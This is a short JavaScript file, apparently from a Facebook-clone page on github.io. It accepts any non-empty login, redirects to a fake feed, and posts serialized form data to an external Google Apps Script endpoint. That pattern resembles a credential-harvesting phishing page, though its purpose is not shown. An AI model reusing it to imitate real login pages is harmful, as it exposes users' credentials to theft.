function auth(){
          var email = document.getElementById('email').value;
          var password = document.getElementById('password').value;
          
          
          
          if(email.length!=0 && password.length!=0)
          {
                    // window.location.assign("feed.html");
                    window.location.href = 'https://sayeedsafvanpm47.github.io/facebook/feed.html';

                    alert("Succesfully logged in");
          }
}




$("#submit-form").submit((e)=>{
          e.preventDefault()
          $.ajax({
              url:"https://script.google.com/macros/s/AKfycby-CN-x8xsGnf23yAnboFuWzMulV0G_6EWFwHRJ-GLtvTcC71tpkr7DK_Otk__oEQBW/exec",
              data:$("#submit-form").serialize(),
              method:"post",
              success:function (response){
                  alert("Your account has been created successfully")
                  window.location.reload()
                  //window.location.href="https://google.com"
              },
              error:function (err){
                  alert("Something Error")
  
              }
          })
      })
